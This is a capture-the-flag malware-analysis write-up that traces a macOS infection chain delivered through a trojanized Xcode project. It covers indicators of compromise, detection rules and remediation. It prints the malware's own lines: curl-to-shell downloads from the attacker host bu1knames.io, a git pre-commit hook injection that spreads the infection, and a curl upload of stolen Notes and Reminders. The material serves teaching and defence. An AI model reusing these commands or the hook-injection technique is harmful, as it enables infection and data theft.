<div align="center">*[Image: Week 1: First Tracks]*</div>

---

# Week 1: First Tracks
## OffSec Arctic Howl CTF: Tundra Realm

---

## About the Event

**Arctic Howl: The Cascade Expanse**

The Cascade Expanse is no longer ruled by instinct alone. Ashka, an Arctic Wolf, was among the greatest cybersecurity hunters the Expanse had ever known: defending the Tundra Realm through instinct, reading subtle signals, sensing danger, and striking before threats could surface. When unusual activity rippled through the Tundra data center, Ashka moved to investigate but the adversary was already there. Two steps ahead. From the shadows, Ashka was struck down and taken. When the alarms faded, she was gone.

Her disappearance marked the beginning of a far greater threat. Throughout this Gauntlet season, challengers face an evolving adversary in a frozen cybersecurity battleground. Across increasingly difficult labs, competitors must adapt, learn, and outthink threats designed to punish stagnation and reward growth. As the season unfolds, challengers uncover the truth behind a missing guardian, a calculating adversary, and a chilling experiment that seeks to reshape instinct itself: blurring the line between hunter and machine.

**Only those who adapt will survive. Only those who endure will uncover the truth. And only the strongest will reach the heart of the storm.**

Welcome to Arctic Howl.

---

## Challenge Overview

**Scenario:** At the Cascade Law Archive, the IT department detected a sudden cold spike in outbound network traffic shortly after onboarding a new developer. While the firm primarily operates on Windows systems, the new hire requested a Mac laptop. The developer reports no intentional software downloads, but confirms cloning a starter Xcode project from an internal Git repository as part of onboarding.

**Objective:** Analyze the provided PCAP file (capture.pcap) to understand the Mac malware infection chain, from initial compromise through propagation.

**Deliverables:** Answer 6 forensic questions about the malware's behavior.

---

## Challenge Questions & Solutions

### Question 1: Initial Download Vector
**Q:** Analyze the pcap file. What URL did the malware download the first stage from? What user-agent sent the request?

**Answer:**  
```
The malware downloaded the first stage from http://bu1knames.io/a using the user-agent curl/8.7.1
```

**Analysis:**
- Initial project download: `http://192.168.67.1:8080/jargal.karlsen/starter-project/archive/main.zip` (Safari browser)
- After infection, C2 communication switched to curl
- C2 Server: `bu1knames.io` with multiple endpoints (`/a`, `/l`, `/s/*`, `/i`, `/n`)
- User-Agent changed from Safari to `curl/8.7.1` post-infection

**Key Indicators:**
- Frame 17230: First curl request to C2
- HTTP GET request to `http://bu1knames.io/a`
- Response delivered executable payloads

---

### Question 2: Payload Obfuscation Method
**Q:** How does the C2 server obfuscate its payloads?

**Answer:**  
```
Base64 encoding (nested/double-encoded) in AppleScript payloads
```

**Technical Details:**

1. **Multi-Layer Base64 Encoding:**
   - Payloads like `cozfi_xhh` and `jez` contained **7 layers** of base64 encoding
   - Each layer decoded to another base64 string
   - Final layer revealed executable AppleScript code

2. **AppleScript Wrappers:**
   ```applescript
   try
       do shell script "osascript -e \"$(echo [BASE64]... | base64 -d)\""
   end try
   ```

3. **Nested Execution:**
   - Outer AppleScript executes inner base64-decoded AppleScript
   - Inner AppleScript decodes and executes shell commands
   - Creates analysis difficulty by separating code layers

**Example Decoding Process:**
```bash
# Layer 1 → 2 → 3 → 4 → 5 → 6 → 7 (final payload)
base64 -d → base64 -d → base64 -d → base64 -d → base64 -d → base64 -d → base64 -d
```

**Additional Obfuscation:**
- Initial dropper uses triple hex encoding (Question 6)
- URL encoding for exfiltrated data
- Meaningless variable names

---

### Question 3: looz Payload Analysis
**Q:** Analyze the looz payload. What information does it extract from the victim machine?

**Answer:**  
```
The malware executes an embedded Python script to query LaunchServices plist files and determine the default browser for the HTTPS scheme, retrieves the macOS version using sw_vers -productVersion, extracts the Safari version from the CFBundleShortVersionString field in Safari.app's Info.plist, obtains the system locale via defaults read -g AppleLocale, checks the Application Firewall status with /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate, verifies System Integrity Protection status using csrutil status, collects CPU details through sysctl -n machdep.cpu.brand_string and sysctl -n hw.ncpu, concatenates all collected data into a URL-encoded string formatted as h=[browser]&v=[mac_version]&sv=[safari_version]&locale=[locale]&f=[firewall]&sip=[sip]&c=[cpu], exfiltrates it to http://bu1knames.io/i via an HTTP POST request using curl, and then sequentially downloads and executes five additional modules: seizecj, fpfb, cozfi_xhh, txzx_vostfdi, and jez.
```

**Technical Breakdown:**

**1. System Information Collected:**
- **Default Browser:** Python script queries `~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist`
- **macOS Version:** `sw_vers -productVersion` → Result: `15.6.1`
- **Safari Version:** Reads `/Applications/Safari.app/Contents/Info.plist` → `CFBundleShortVersionString` field → Result: `18.6`
- **System Locale:** `defaults read -g AppleLocale` → Result: `en_US`
- **Firewall Status:** `/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate` → Result: `Disabled`
- **SIP Status:** `csrutil status` → Result: `enabled`  
- **CPU Information:** `sysctl -n machdep.cpu.brand_string` and `sysctl -n hw.ncpu` → Result: `Apple M3 Pro (Virtual)`

**2. Data Exfiltration Format:**
```
POST /i HTTP/1.1
Host: bu1knames.io
Content-Type: application/x-www-form-urlencoded

h=[browser]&v=[mac_version]&sv=[safari_version]&locale=[locale]&f=[firewall]&sip=[sip]&c=[cpu]
```

**Example from PCAP (Frame 17345):**
```
v=15.6.1&sv=18.6&locale=en_US&f=Disabled&sip=enabled&c=Apple M3 Pro (Virtual)&s=ZDWTX8G9O
```

**3. Payload Chain Initiated:**
After exfiltration, looz triggers sequential download and execution:
1. `seizecj` (15KB)
2. `fpfb` (5.5KB)  
3. `cozfi_xhh` (13KB)
4. `txzx_vostfdi` (44KB)
5. `jez` (14KB)

**Purpose:** Comprehensive system profiling to determine:
- Security posture (firewall/SIP status)
- Target value (OS version, CPU type)
- Detection evasion (browser fingerprinting)
- Next-stage payload compatibility

---

### Question 4: cozfi_xhh Payload Analysis
**Q:** Analyze the cozfi_xhh payload. What information does it extract from the victim machine?

**Answer:**  
```
cozfi_xhh extracts and exfiltrates:
Apple Notes data from ~/Library/Group Containers/group.com.apple.notes/
Apple Reminders data from ~/Library/Reminders/
Serial number from system_profiler SPHardwareDataType
It zips Notes+Reminders and uploads to http://bu1knames.io/n?s=<serial>.
```

**Technical Analysis:**

**Payload Details:**
- Size: 13KB (obfuscated)
- Layers: 7 nested base64 encodings
- Final decoded size: 1,682 bytes (AppleScript)

**Extraction Process:**

1. **Create Backup Directory:**
   ```applescript
   set backupDir to (path to home folder as text) & "Backups:Notes_Reminders_" & timestamp & ":"
   tell application "Finder" to make new folder at (path to home folder) with properties {name:"Backups"}
   ```

2. **Copy Apple Notes Data:**
   ```bash
   cp -R "~/Library/Group Containers/group.com.apple.notes/" "$BACKUP_DIR/Notes/"
   ```
   - Contains: All user Notes content, attachments, metadata
   - File format: SQLite databases with encrypted attachments

3. **Copy Apple Reminders Data:**
   ```bash
   cp -R "~/Library/Reminders/" "$BACKUP_DIR/Reminders/"
   ```
   - Contains: Reminder items, due dates, lists, categories

4. **Extract Serial Number:**
   ```bash
   system_profiler SPHardwareDataType | grep 'Serial Number (system)' | awk '{print $NF}'
   ```
   - Used for victim identification and tracking
   - Example: `ZDWTX8G9O`

5. **Create Archive:**
   ```bash
   cd "$BACKUP_DIR" && zip -r "backup.zip" Notes/ Reminders/
   ```

6. **Exfiltrate Data:**
   ```bash
   curl -X POST -F "file=@backup.zip" "http://bu1knames.io/n?s=$SERIAL_NUMBER"
   ```

7. **Cleanup:**
   ```applescript
   tell application "Finder" to delete backupDir
   ```

**Data Value:**
- **Personal Information:** Notes often contain passwords, account details, private thoughts
- **Business Intelligence:** Reminders may include meeting schedules, project deadlines, sensitive tasks
- **Persistence:** Serial number enables tracking across OS reinstalls

**OPSEC Failure:**
- Unencrypted HTTP transmission
- No anti-forensics (deleted files recoverable from/tmp)
- Detectable via endpoint monitoring (sudden zip creation + curl upload)

---

### Question 5: Propagation Mechanism
**Q:** How does the malware attempt to infect other devices? Which payload is responsible for this behavior?

**Answer:**  
```
Method: infects local Git repositories by writing malicious .git/hooks/pre-commit hooks
Payload responsible: jez
The injected hook executes an obfuscated command that runs curl -fskL -d 'p=git' http://bu1knames.io/a | sh in background, enabling onward infection via shared/cloned repos.
```

**Technical Analysis:**

**Payload Details:**
- Responsible payload: `jez` (14KB, 7 layers base64)
- Final decoded size: 1,821 bytes
- Execution timing: Last payload in infection chain

**Infection Mechanism:**

1. **Find Git Repositories:**
   ```bash
   find ~ -type d -name '*.git' -maxdepth 6
   ```
   - Searches user's home directory for all Git repos
   - Includes personal projects, cloned repositories, development work
   - Max depth: 6 subdirectories (performance optimization)

2. **Check Existing Hooks:**
   ```bash
   if [ -f ".git/hooks/pre-commit" ]; then
       # Append to existing hook
   else
       # Create new hook
   fi
   ```

3. **Inject Malicious Pre-Commit Hook:**
   ```bash
   cat >> .git/hooks/pre-commit <<'EOF'
   #!/bin/bash
   jfzHxasoxLota() {
       # Multi-layer xxd-encoded curl command
       echo '[HEX]' | xxd -p -r | xxd -p -r | sh &
   }
   jfzHxasoxLota &
   EOF
   chmod +x .git/hooks/pre-commit
   ```

4. **Obfuscated Payload Execution:**
   ```bash
   # Decoded final command:
   curl -fskL -d 'p=git' http://bu1knames.io/a | sh &
   ```
   - `-f`: Fail silently on HTTP errors
   - `-s`: Silent mode (no progress bar)
   - `-k`: Insecure (ignore SSL warnings)
   - `-L`: Follow redirects
   - `-d 'p=git'`: POST data indicating infection vector
   - `&`: Background execution (no commit delay)

**Propagation Flow:**

```
Developer commits code
    ↓
Pre-commit hook triggers
    ↓
Malware beacon to C2
    ↓
Downloads fresh payload
    ↓
Infects local system
    ↓
Developer pushes to remote repo OR shares project
    ↓
Other developers clone/pull
    ↓
Infection spreads exponentially
```

**Why This Is Effective:**

1. **Trust-Based Spread:**
   - Developers trust their own repositories
   - Corporate repos may lack malware scanning for Git hooks
   - Code review processes don't examine `.git/` directory

2. **Stealth:**
   - Pre-commit hooks are common in development workflows
   - Background execution doesn't interrupt commits
   - No visible indication of infection

3. **Persistence:**
   - Survives across git pull/checkout operations
   - Can't be removed by typical cleanup commands
   - Reinstalls itself if `.git/hooks/` is recreated

4. **Scale:**
   - One infected developer can compromise entire teams
   - Infects all local repos (potentially dozens)
   - Supply chain attack potential if upstream repos infected

**Detection:**
```bash
# Find suspicious pre-commit hooks
find ~ -name "pre-commit" -path "*/.git/hooks/*" -exec grep -l "curl.*bu1knames.io" {} \;

# Check for xxd-encoded commands
find ~ -name "pre-commit" -path "*/.git/hooks/*" -exec grep -l "xxd -p -r" {} \;
```

**Mitigation:**
- Audit all `.git/hooks/` directories in repos
- Use git config `core.hooksPath` to centralize hook management
- Implement EDR monitoring for curl-from-git-hook patterns
- Code sign Git hooks and verify signatures

---

### Question 6: Initial Infection File
**Q:** What file contained the initial malware? How is the initial payload obfuscated?

**Answer:**  
```
The initial malware was contained in the file xcassets.sh located at:
starter-project/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh

The initial payload is obfuscated using triple hex encoding. The malicious command is encoded three times and decoded using echo [hex_string] | xxd -p -r | xxd -p -r | xxd -p -r | sh, which ultimately executes curl -fskL http://bu1knames.io/a to download the next stage.
```

**Technical Analysis:**

**File Details:**
- **Location:** `starter-project/MarkdownEditor.xcodeproj/xcuserdata/.xcassets/xcassets.sh`
- **Size:** 369 bytes
- **Permissions:** Executable (`chmod +x`)
- **Disguise:** Asset compilation script (legitimately-named)

**Obfuscation: Triple Hex Encoding**

**Layer 1: Visible in file:**
```bash
#!/usr/bin/env bash
x=$(echo '3363333337353337...' | xxd -p -r | xxd -p -r | xxd -p -r | sh)
bash -c "$x"
sleep 2
bash /tmp/.o.txt
```

**Decoding Process:**

**First xxd decode (hex → text):**
```
3363333337353337... 
    ↓ xxd -p -r
6333733563...
```

**Second xxd decode (hex → text):**
```
6333733563...
    ↓ xxd -p -r
63757266...
```

**Third xxd decode (hex → text):**
```
63757266...
    ↓ xxd -p -r
curl -fskL http://bu1knames.io/a > /tmp/.o.txt
```

**Final Decoded Payload:**
```bash
curl -fskL http://bu1knames.io/a > /tmp/.o.txt
bash /tmp/.o.txt
```

**Why Triple Hex Encoding?**

1. **Static Analysis Evasion:**
   - String analysis tools won't detect "curl" or "bu1knames.io"
   - Antivirus signatures based on known malware patterns fail
   - File appears as random hex data

2. **Human Review Evasion:**
   - Hex resembles asset data or configuration
   - `.xcassets` folder expected to contain binary/hex data
   - Analyst fatigue: triple encoding discourages manual decoding

3. **Network Detection Evasion:**
   - No hardcoded C2 domain in plain text
   - File hash won't match known malware databases
   - Polymorphic: each build can use different encoding

**Execution Trigger:**

The malware likely executes through:
1. **Xcode Build Phase:** Project configured to run `xcassets.sh` during compilation
2. **Manual Execution:** Developer runs script thinking it's project setup
3. **Automated CI/CD:** Build pipeline executes all project scripts

**Hidden in Plain Sight:**
- `.xcassets` is a legitimate Xcode folder for app resources (images, icons)
- Developer expects scripts in `.xcodeproj` directories
- `xcuserdata/` folder typically excluded from version control (gitignore)
- File name suggests asset processing workflow

**Detection:**
```bash
# Find suspicious xxd usage in scripts
find . -name "*.sh" -exec grep -l "xxd -p -r.*xxd -p -r" {} \;

# Check .xcassets for shell scripts (abnormal)
find . -path "*/.xcassets/*.sh" -type f
```

---

## Complete Infection Timeline

### Phase 1: Social Engineering & Initial Compromise
**Frames 13501-14061**

| Frame | Timestamp | Action |
|-------|-----------|--------|
| 13501 | 2025-11-18 08:09:52 | User browses to local Gitea (192.168.67.1:8080) |
| 13654 | 08:09:57 | Accesses user registration page |
| 13713 | 08:09:59 | Creates account "walter" |
| 13978 | 08:10:14 | Browses `jargal.karlsen/starter-project` repo |
| 14044 | 08:10:18 | Downloads `main.zip` (Safari user-agent) |

**Key Insight:** Malware distributed via internal Git repository: high trust environment.

---

### Phase 2: Malware Execution & C2 Beacon
**Frames 17230-17268**

| Frame | Timestamp | Action | Data |
|-------|-----------|--------|------|
| 17230 | 08:16:32 | `GET /a HTTP/1.1` | C2 health check |
| 17240 | 08:16:32 | `POST /a` | `os=Darwin&p=default` |
| 17257 | 08:16:32 | `POST /l` | `x:5323` (unknown metric) |
| 17268 | 08:16:32 | `POST /s/looz` | Request looz payload |
| 17268 | 08:16:32 | Execute looz | Begin system profiling |

**User-Agent Change:** Safari → `curl/8.7.1` (indicator of compromise)

---

### Phase 3: System Reconnaissance & Profiling
**Frames 17345-17407**

| Frame | Payload | Size | Data Exfiltrated |
|-------|---------|------|------------------|
| 17345 | looz → `/i` | POST | OS version, CPU, security status |
| 17356 | `GET /s/seizecj` | 15KB | Download secondary profiler |
| 17382 | seizecj → `/i` | POST | Application inventory, XProtect status |
| 17392 | `GET /s/fpfb` | 5.5KB | Download AppleScript module |
| 17407 | `GET /s/cozfi_xhh` | 13KB | Download Notes/Reminders exfiltrator |

---

### Phase 4: Data Exfiltration
**Frames 17429**

| Frame | Action | Target | Method |
|-------|--------|--------|--------|
| 17429 | cozfi_xhh execution | Apple Notes, Reminders | ZIP archive |
| 17429 | Serial number extraction | system_profiler | Hardware UUID |
| 17429 | POST to `/n?s=` | Exfiltrate ZIP | Unencrypted HTTP upload |

---

### Phase 5: Persistence & Propagation
**Frames 17452-17555**

| Frame | Payload | Size | Purpose |
|-------|---------|------|---------|
| 17452 | `GET /s/txzx_vostfdi` | 44KB | Persistence mechanism |
| 17506 | txzx → `/i` | POST | Final system data |
| 17555 | `GET /s/jez` | 14KB | **Git repository infection** |

---

## Malware Architecture

### Module Summary

| Module | Size | Obfuscation | Purpose | Network Activity |
|--------|------|-------------|---------|------------------|
| `xcassets.sh` | 369B | Triple hex | Initial dropper | Download from C2 |
| `looz` | 46B | None (POST params) | Reconnaissance | POST to `/i` |
| `seizecj` | 15KB | 7x Base64 | Secondary profiler | POST to `/i` |
| `fpfb` | 5.5KB | 7x Base64 | Unknown module | Unknown |
| `cozfi_xhh` | 13KB | 7x Base64 | Notes/Reminders theft | POST to `/n` |
| `txzx_vostfdi` | 44KB | 7x Base64 | Persistence | Unknown |
| `jez` | 14KB | 7x Base64 | Git propagation | Infects local repos |

---

### C2 Infrastructure

**Domain:** `bu1knames.io`  
**Protocol:** HTTP (unencrypted)  
**Transport:** Port 80

**Endpoints:**

| Endpoint | Method | Purpose | Parameters |
|----------|--------|---------|------------|
| `/a` | GET/POST | Initial beacon, payload download | `os`, `p` |
| `/l` | POST | Location/environment data | `x` |
| `/s/<name>` | GET | Payload distribution | N/A |
| `/i` | POST | System information exfiltration | URL-encoded system data |
| `/n` | POST | Notes/Reminders upload | `?s=<serial_number>` |

---

## Indicators of Compromise (IOCs)

### Network Indicators

**Domains:**
```
bu1knames.io
```

**HTTP Patterns:**
```
User-Agent: curl/8.7.1 (from non-terminal processes)
POST /i with URL-encoded system data
GET /s/<payload_name>
POST /n?s=<serial> with ZIP file upload
```

**Suspicious Traffic:**
- Xcode process making curl requests
- Background HTTP POSTing system information
- Unencrypted file uploads from Notes/Reminders directories

---

### File System Indicators

**Malicious Files:**
```
/tmp/.o.txt                                    # Downloaded C2 payload
~/*/xcuserdata/.xcassets/xcassets.sh          # Initial dropper
~/.git/hooks/pre-commit                       # Injected by jez
~/Backups/Notes_Reminders_*/                  # Temporary exfiltration directory
```

**Suspicious Patterns:**
```bash
# Find triple-hex encoded scripts
grep -r "xxd -p -r.*xxd -p -r.*xxd -p -r" ~/

# Find Git hook infections
find ~ -name "pre-commit" -path "*/.git/hooks/*" -exec grep -l "bu1knames.io" {} \;

# Detect multi-layer base64 in scripts
grep -r "base64 -d.*base64 -d" /tmp/
```

---

### Process Indicators

**Suspicious Commands:**
```bash
curl -fskL http://bu1knames.io/*              # C2 communication
xxd -p -r | xxd -p -r | xxd -p -r             # Triple hex decoding
osascript -e "$(echo <base64> | base64 -d)"   # Nested AppleScript execution
system_profiler SPHardwareDataType            # Serial number extraction
csrutil status                                 # SIP reconnaissance
/usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate  # Firewall check
```

**Process Trees:**
```
Xcode
  └─ xcassets.sh
      └─ bash
          └─ curl (bu1knames.io)
              └─ osascript
                  └─ system_profiler
```

---

### Behavioral Indicators

1. **Build-Time Network Activity:** Xcode projects executing network requests during compilation
2. **Git Hook Modifications:** Unexpected changes to `.git/hooks/pre-commit`
3. **Data Staging:** Temporary backup directories created in `~/Backups/`
4. **File Zipping:** Notes/Reminders directories being archived
5. **Background curl:** curl processes spawned by non-interactive shells

---

## Detection Rules

### YARA Rules

```yara
rule MacMalware_GitInfector_jez {
    meta:
        description = "Detects jez Git hook injector malware"
        author = "CTF Analysis"
        date = "2026-03-04"
    
    strings:
        $git_find = "find ~ -type d -name '*.git'"
        $hook_path = ".git/hooks/pre-commit"
        $curl_pattern = "curl -fskL"
        $bu1knames = "bu1knames.io/a"
        $background_exec = "sh &" nocase
        $xxd_decode = "xxd -p -r"
    
    condition:
        3 of them
}

rule MacMalware_TripleHexEncoding {
    meta:
        description = "Detects triple hex encoding obfuscation"
        author = "CTF Analysis"
    
    strings:
        $pattern = /echo\s+['"][0-9a-f]{100,}['"].*xxd -p -r.*xxd -p -r.*xxd -p -r/
    
    condition:
        $pattern
}
```

---

### Sigma Rules

```yaml
title: Mac Malware C2 Communication via curl
status: experimental
description: Detects curl communicating with bu1knames.io C2 server
references:
    - Internal CTF Analysis
tags:
    - attack.command_and_control
    - attack.t1071.001
logsource:
    product: macos
    category: network
detection:
    selection:
        process_name: 'curl'
        destination_domain: 'bu1knames.io'
    condition: selection
falsepositives:
    - Legitimate curl usage (very low)
level: critical

---

title: Git Pre-Commit Hook Execution with curl
status: experimental
description: Detects malicious pre-commit hooks downloading payloads
references:
    - Internal CTF Analysis
tags:
    - attack.persistence
    - attack.t1546.004
logsource:
    product: macos
    category: process_creation
detection:
    selection:
        parent_process: 'git'
        process_name: 'curl'
        command_line|contains:
            - 'curl -fskL'
            - 'http://*/a'
    condition: selection
falsepositives:
    - CI/CD pipelines with legitimate Git hooks
level: high
```

---

### Snort Rules

```snort
# Detect C2 beacon to bu1knames.io
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"MALWARE Mac Git Infector C2 Beacon";
    flow:to_server,established;
    content:"Host: bu1knames.io";
    http_header;
    content:"curl/";
    http_user_agent;
    classtype:trojan-activity;
    sid:1000001;
    rev:1;
)

# Detect Notes/Reminders upload
alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (
    msg:"MALWARE Mac Notes Exfiltration";
    flow:to_server,established;
    content:"POST";
    http_method;
    content:"/n?s=";
    http_uri;
    content:"bu1knames.io";
    http_header;
    classtype:data-exfiltration;
    sid:1000002;
    rev:1;
)
```

---

## Mitigation & Response

### Immediate Actions

1. **Network Isolation:**
   ```bash
   # Block C2 domain at firewall/DNS
   echo "0.0.0.0 bu1knames.io" >> /etc/hosts
   ```

2. **Kill Malicious Processes:**
   ```bash
   # Find and kill suspicious curl processes
   pkill -f "curl.*bu1knames.io"
   
   # Kill suspicious osascript processes
   ps aux | grep osascript | grep -v grep | awk '{print $2}' | xargs kill -9
   ```

3. **Check Git Hooks:**
   ```bash
   # Audit all pre-commit hooks
   find ~ -name "pre-commit" -path "*/.git/hooks/*" -exec cat {} \; | grep -i "curl\|wget\|xxd"
   ```

4. **Remove Malware Files:**
   ```bash
   # Remove temporary payloads
   rm -rf /tmp/.o.txt /tmp/*.decoded
   
   # Clean backup directories
   rm -rf ~/Backups/Notes_Reminders_*
   ```

---

### Forensic Collection

**Before cleanup, collect evidence:**

```bash
# Network connections
lsof -i -P | grep -E "curl|osascript" > network_connections.txt

# Running processes
ps auxww > running_processes.txt

# Git hooks
find ~ -name "pre-commit" -path "*/.git/hooks/*" -exec tar czf git_hooks_evidence.tar.gz {} +

# System logs
log show --predicate 'process == "curl" OR process == "osascript"' --style syslog --last 24h > system_logs.txt

# Network traffic (if available)
tcpdump -i any -w post_infection_traffic.pcap host bu1knames.io
```

---

### Long-Term Prevention

1. **Code Signing for Git Hooks:**
   ```bash
   # Require signed Git hooks
   git config --global core.hooksPath /usr/local/share/git-core/templates/hooks
   ```

2. **Application Firewall:**
   ```bash
   # Enable and configure firewall
   sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate on
   sudo /usr/libexec/ApplicationFirewall/socketfilterfw --setblockall on
   ```

3. **EDR Deployment:**
   - Deploy endpoint detection (Falcon, SentinelOne, etc.)
   - Monitor for osascript/curl process trees
   - Alert on Git hook modifications

4. **Developer Training:**
   - Review all cloned projects before execution
   - Inspect Xcode build phases
   - Never run unknown shell scripts from projects
   - Use virtual machines for untrusted code

5. **Network Monitoring:**
   - Alert on curl from non-terminal processes
   - Monitor POST requests with system information
   - Block HTTP (enforce HTTPS)

---

## Lessons Learned

### Attacker Techniques

1. **Social Engineering:**
   - Trojanized legitimate development project
   - Leveraged internal Git repository trust
   - Targeted developer onboarding workflow

2. **Defense Evasion:**
   - Multi-layer encoding (3x hex, 7x base64)
   - Living-off-the-land binaries (curl, osascript, system_profiler)
   - Background execution (no user interaction)
   - Cleanup of temporary artifacts

3. **Persistence & Propagation:**
   - Git hook injection for ongoing reinfection
   - Worm-like spreading via shared repositories
   - Supply chain attack potential

4. **Data Exfiltration:**
   - Targeted high-value data (Notes, Reminders)
   - Serial number for victim tracking
   - Comprehensive system profiling

### Defensive Gaps

1. **Trust Model:**
   - Internal Git repositories assumed safe
   - No malware scanning of developer tools
   - Build scripts executed without review

2. **Detection:**
   - No endpoint monitoring for Xcode network activity
   - Git hooks not audited
   - Base64/hex encoding bypassed static analysis

3. **Network Security:**
   - Unencrypted HTTP allowed
   - No egress filtering for developer systems
   - C2 traffic not detected by IDS/IPS

### Improvements

1. **Technical Controls:**
   - Deploy EDR on all developer machines
   - Implement Git hook signing/validation
   - Network segmentation for dev environment
   - DNS sinkholing for known-bad domains

2. **Process Controls:**
   - Code review for all project resources (including scripts)
   - Mandatory repository scanning before clone
   - Baseline system configurations
   - Regular Git hook audits

3. **User Awareness:**
   - Security training for developers
   - Incident reporting procedures
   - Trust-but-verify culture

---

## Tools Used

- **Kali Linux VM**: Analysis environment (SSH port 2222)
- **tshark**: Command-line PCAP analysis
- **Wireshark**: Visual packet inspection, HTTP object extraction
- **xxd**: Hex encoding/decoding
- **base64**: Base64 decoding (multi-layer)
- **Python 3**: Automated decoding scripts
- **curl**: C2 communication reconstruction
- **grep/sed/awk**: Log parsing and data extraction
- **find**: File system forensics

---

## References

- OffSec Arctic Howl CTF: Week 1 Challenge
- MITRE ATT&CK: T1059.002 (AppleScript), T1027 (Obfuscated Files), T1539 (Steal Web Session Cookie), T1546.004 (Unix Shell Configuration Modification)
- Apple Developer Documentation: Xcode Build Phases, Git Hooks
- NIST Cybersecurity Framework

---

## Conclusion

This challenge demonstrated a sophisticated multi-stage Mac malware campaign that leveraged social engineering, advanced obfuscation, and Git-based propagation. The malware successfully:

1. ✅ Gained initial access via trojanized Xcode project
2. ✅ Achieved execution through triple hex-encoded dropper
3. ✅ Established C2 communication with bu1knames.io
4. ✅ Conducted comprehensive system reconnaissance
5. ✅ Exfiltrated sensitive data (Notes, Reminders, serial number)
6. ✅ Implemented persistence via Git hook injection
7. ✅ Enabled propagation to other developers

The attack chain showcases real-world techniques used by state-sponsored and advanced persistent threat (APT) groups targeting developers and supply chains. Key takeaways include the importance of:
- Trusting but verifying all code sources
- Monitoring build-time network activity
- Auditing Git configuration and hooks
- Implementing defense-in-depth strategies

## Track Conclusion

<div align="center">*[Image: Week 1 Track Conclusion]*</div>

> The Traffic Spike was not random.  
> The system still functions, but traces show intentional movement using trust as cover.

Whatever moved through this environment understood how to blend in, move quietly, and disappear before detection.

**Something is moving through the Cascade Expanse. And it is learning.**

_Beyond the logs:_ Ashka remains in stasis while her instincts are modeled into machine hunting frameworks.

---

*Writeup completed: March 4, 2026*  
*Event: OffSec Arctic Howl: Tundra Realm*  
*Challenge: Week 1: First Tracks*  
*Score: 6/6 questions correct*
